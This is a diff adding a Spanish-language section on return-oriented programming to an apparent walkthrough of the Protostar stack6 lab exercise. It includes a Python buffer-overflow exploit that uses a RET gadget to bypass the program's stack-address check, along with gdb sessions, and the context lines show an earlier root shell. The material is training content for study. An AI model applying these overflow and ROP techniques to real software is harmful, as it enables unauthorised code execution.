@@ -321,4 +321,54 @@ input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 whoami
 root
 ```
+# Extra ROP programming 
 
+El rop programming significa que nos aprovechamos de insutrucciones de ensamblador del propio código para hacer determinadas cosas en el programa.
+Una de ellas es la intrucción **RET**, la cuál hace un *POP EIP*, 
+
+Es decir la última instruccion de la pila (dirección de RET) la pasa al eip, eliminandose a si misma (POP EIP), pero haciendo otro POP EIP de lo que haya despues (EIP a la pila por ejemplo), asi podemos burlar protecciones de no retorno a la pila como ```if((ret & 0xbf000000) == 0xbf000000)``` ES decir es como que pasa el turno... Vamos a verlo en acción.
+
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack6
+(gdb) disas getpath
+... Muchas instrucciones :V
+0x080484f8 <getpath+116>:	leave  
+0x080484f9 <getpath+117>:	ret  -> Esta es la instruccion que nos interesa :)
+```
+Ahora a armar el exploit.
+
+```python
+import struct
+offset = 80
+padding = "A" * offset
+ret = struct.pack("I",0x080484f9)
+eip = struct.pack("I",0xbffff6a4+8)
+breakpoint = "\xCC" * 90
+print(padding + ret + eip + breakpoint)
+```
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python /tmp/exploit.py > /tmp/pattern
+[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack6
+(gdb) run < /tmp/pattern
+Program received signal SIGTRAP, Trace/breakpoint trap
+(gdb) x/4wx $esp
+0xbffff69c:	0x080484f9	0xbffff6ac	0xcccccccc	0xcccccccc -> COmo hemos dicho el RET, ha pasado al eip la siguiente dirección.
+(gdb) si
+(gdb) x/4wx $esp
+0xbffff6a0:	0xbffff6ac	0xcccccccc	0xcccccccc	0xcccccccc -> Ha saltado a una zona de "c" o breakpoint
+(gdb) c
+Continuing.
+Program received signal SIGTRAP, Trace/breakpoint trap.
+```
+En cambio sin ese RET...
+
+```console
+print(padding + eip + breakpoint)
+```
+```console
+(gdb) run < /tmp/pattern
+Starting program: /opt/protostar/bin/stack6 < /tmp/pattern
+input path please: bzzzt (0xbffff6ac)
+Program exited with code 01.
+```
